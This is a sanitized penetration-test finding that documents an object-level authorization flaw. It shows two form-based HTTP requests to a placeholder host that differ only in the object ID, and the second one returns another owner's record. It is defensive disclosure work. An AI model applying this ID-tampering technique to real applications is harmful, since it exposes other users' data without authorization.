# F-03 Technical Validation

> Sanitized reconstruction. Original routes, parameter names, object identifiers, account data, session material, and response content are replaced. The form-based request structure and object-reference change reflect the confirmed test.

## Authorized object access

```http
POST /?object=1001 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[user-a-state]
```

The application returned an object available to the authenticated test context.

## Object reference modification

The authenticated state and request body were kept unchanged while only the object reference was modified:

```http
POST /?object=1002 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[user-a-state]
```

The application returned the referenced object even though it was outside the expected ownership boundary of the caller.

## Security conclusion

Authentication remained valid in both requests, but changing only the client-controlled object reference crossed the expected data-access boundary. The failure was therefore object-level authorization, not authentication bypass.
